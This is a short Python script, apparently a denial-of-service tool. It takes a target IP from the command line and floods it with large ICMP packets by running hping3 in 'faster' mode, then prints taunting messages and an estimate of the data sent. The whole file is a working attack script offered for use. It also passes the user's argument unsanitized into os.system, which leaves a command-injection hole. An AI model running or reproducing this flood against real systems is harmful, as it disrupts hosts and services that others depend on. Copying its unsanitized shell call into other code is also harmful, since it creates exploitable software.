import os, sys, time, datetime

INFO_INIT_1 = '[DDoS] Starting the attack on the given IP '
INFO_INIT_2 = '(Press CTRL+C to stop me)...'
INFO_STATS = '[DDoS] Quitting, showing stats:'
ATTACK_FIN = '[DDoS] Completed the attack  >:D'
PKTS_CADENCE = 100
PKTS_LEN = 1442
DATA_LEN = 1000000
DATA_STR = 'MB'



def get_str_time():
	return ('[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']')
def diff():
	return (datetime.datetime.now() - time_init)

def stats():
	return ('Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: ' + str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')

if __name__ == "__main__":

	time_init = datetime.datetime.now()
	print(INFO_INIT_1 + sys.argv[1] + ' ' + INFO_INIT_2)
	os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])	
	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
	print(get_str_time() + ATTACK_FIN)
